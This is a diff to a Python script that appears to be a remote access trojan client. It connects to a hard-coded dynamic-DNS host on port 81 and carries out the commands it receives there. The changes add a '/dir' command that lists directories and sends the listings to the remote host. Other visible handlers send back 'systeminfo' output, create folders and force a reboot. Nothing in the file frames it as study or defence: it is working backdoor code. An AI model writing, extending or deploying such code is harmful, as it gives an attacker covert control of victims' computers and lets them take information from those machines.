@@ -8,14 +8,11 @@ host = 'dimagamera.ddns.net'
 port = 81
 
 while True:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
+	data = "Connected"
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host, port))
-		data = "Connected"
-		if not data:
-			s.close()
-			sys.exit()
-			
+
 		a = s.recv(1024)
 		a = a.decode()
 		if a == '/cmd':
@@ -60,12 +57,51 @@ while True:
 			dir = s.recv(1024)
 			dir = dir.decode()
 			os.system('mkdir '+ str(dir))
+
+		elif a == "/dir":
+			num = s.recv(1024)
+			num = num.decode()
+			if num == '1':
+				c = s.recv(1024)
+				c = c.decode()
+				if c == '1':
+					print('111111111111111111111')
+					d = os.listdir()
+					f = open('files.txt', 'w')
+					for item in d:
+						f.write(item+'\n')
+					f.close()
+					f = open('files.txt','rb')
+					while True:
+						a = f.read(1024)
+						if not a:
+							break
+						s.send(a)
+					f.close()
+					os.remove('files.txt')
+				elif c == '2':
+					print('222222222222222222')
+					d = s.recv(1024)
+					d = d.decode()
+					d = os.listdir(d)
+					f = open('files.txt', 'w')
+					for item in d:
+						f.write(item+'\n')
+					f.close()
+					f = open('files.txt','rb')
+					while True:
+						a = f.read(1024)
+						if not a:
+							break
+						s.send(a)
+					f.close()
+					os.remove('files.txt')					
+
 		elif a == "/sysinfo":
 			cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
 			cmd_process = cmd_process.stdout + cmd_process.stderr
 			s.send(cmd_process)
-		elif a == "/webcam":
-			pass
+
 		elif a == "/poff":
 			os.system('shutdown /r /f /t 0')
 	except:
